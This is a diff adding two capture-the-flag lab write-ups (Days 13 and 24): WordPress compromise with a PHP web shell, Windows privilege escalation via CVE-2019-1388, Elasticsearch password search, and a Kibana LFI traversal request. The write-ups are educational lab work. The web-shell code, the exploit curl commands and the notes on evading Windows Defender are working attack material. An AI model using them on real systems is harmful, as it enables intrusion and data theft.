@@ -165,7 +165,48 @@ Enter pass phrase for private.key:
 **REDACTED**
 ```
 
-## Day 13 - TODO
+## Day 13
+
+1. `nmap -Pn -A`) reveals HTTP and RDP services on standard ports on a Windows system.
+
+2. On the HTTP server, `gobuster` helps discover a `/retro` directory containing a Wordpress blog. The second oldest post goes:
+
+```
+Ready Player One
+by Wade
+
+(...) I honestly feel a deep connection to the main character Wade.
+I keep mistyping the name of his avatar whenever I log (...)
+```
+
+which allows to guess the password (Wade's avatar in [Ready player One](https://en.wikipedia.org/wiki/Ready_Player_One)) for user `wade`.
+
+3. **[Dead end]** This allows to log in into the Wordpress panel (with administrator's role) and then:
+* Use Metasploit exploit `unix/webapp/wp_admin_shell_upload` to get a meterpreter and a reverse shell. Except the server runs under Windows here...
+* Equivalently (this is actually what Metasploit automates), manually install a malicious Wordpress plugin to get a reverse shell. One would need to find a Windows version though...
+* More elementary, edit the theme (_Appearance > Theme Editor_) and inject a (Windows) PHP reverse shell (for instance in the `404.php` template).
+  * If the reverse shell is based on writing a binary payload (e.g. crafted by `msfvenom`) and run it (such as [this example](https://github.com/Dhayalanb/windows-php-reverse-shell)), then it will be neutralized by Windows Defender (_you see the alerts if you are connected through RDP as done below_). Some more advanced `msfvenom` options can help hiding the signature of the payload to bypass the malware detection, but this gets tedious...
+  * We could not get some [reverse powershell payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) to work either...
+* Even more elementary, one can inject a simple [PHP web shell](https://github.com/JohnTroony/php-webshells):
+
+```php
+<?php header('Content-type: text/plain'); system($_GET['cmd']); ?>
+```
+
+```
+$ curl http://$TARGET_IP/retro/wp-content/themes/90s-retro/404.php?cmd=whoami
+nt authority\iusr
+```
+
+But **anyways** we would get logged in as the **default anonymous user** and could not even access Wade's home... Exploiting some Wordpress vulnerabilities might also be an option, but this probably would not help for that exact same reason.
+
+3. **[Working approach]** Use these Wordpress credentials to connect through RDP using Remmina! The **user flag** in on Wade's desktop.
+
+4. To escalate privileges, you are hinted to look at what the user was last trying to do. Conveniently, there is a `hhupd.exe` file on the desktop which, after some research, seems to correspond to [this amazing exploit (CVE-2019-1388)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#cve-2019-1388)! We get a `cmd` as `nt authority\system` and grab the **root flag**:
+```
+> type C:\Users\Administrator\Desktop\root.txt
+**REDACTED**
+```
 
 ## Day 14
 
@@ -333,4 +374,61 @@ $ cat /home/user/flag.txt
 **REDACTED**
 ```
 
-## Day 24 - TODO
+## Day 24
+
+1. `nmap -sV`
+
+```
+PORT     STATE SERVICE   REASON          VERSION
+22/tcp   open  ssh       syn-ack ttl 254 OpenSSH 7.4 (protocol 2.0)
+111/tcp  open  rpcbind   syn-ack ttl 254 2-4 (RPC #100000)
+5601/tcp open  esmagent? syn-ack ttl 254
+8000/tcp open  http      syn-ack ttl 254 SimpleHTTPServer 0.6 (Python 3.7.4)
+9200/tcp open  http      syn-ack ttl 254 Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
+9300/tcp open  vrace?    syn-ack ttl 254
+2 services unrecognized despite returning data.
+```
+
+Investigating further, we find:
+  * A Kibana 6.4.2 log file `http://$TARGET_IP:8000/kibana-log.txt` on the HTTP server;
+  * Kibana on port 5610.
+
+2. Using [Elasticsearch API](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html), we find the (actually useless) requested password.
+
+```
+$ curl -s "http://10.10.118.26:9200/_search?q=*pass*" | jq
+{
+...
+  "hits": {
+...
+    "hits": [
+      {
+        "_index": "messages",
+...
+        "_source": {
+          "sender": "mary",
+          "receiver": "wendy",
+          "message": "hey, can you access my dev account for me. My username is l33tperson and my password is **REDACTED**"
+        }
+      }
+    ]
+  }
+}
+```
+
+3. Looking for vulnerabilities, we discover a [Kibana < 6.4.3 LFI (CVE-2018-17246)](https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it) allowing to execute any local JS code. There does not seem to be a way to upload some code to the server (e.g. to get a reverse shell), but it is good enough here to include the **root flag** file and to read the resulting error in the log.
+
+```
+$ curl "http://$TARGET_IP:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../root.txt"
+Ctrl-C
+$ curl -s http://$TARGET_IP:8000/kibana-log.txt | tail -1 | jq
+{
+...
+  "error": {
+    "message": "Unhandled promise rejection. (...) (rejection id: 15)",
+    "name": "UnhandledPromiseRejectionWarning",
+    "stack": "ReferenceError: **REDACTED** is not defined\n    at Object.<anonymous> (/root.txt:1:6) (...)"
+  },
+...
+}
+```
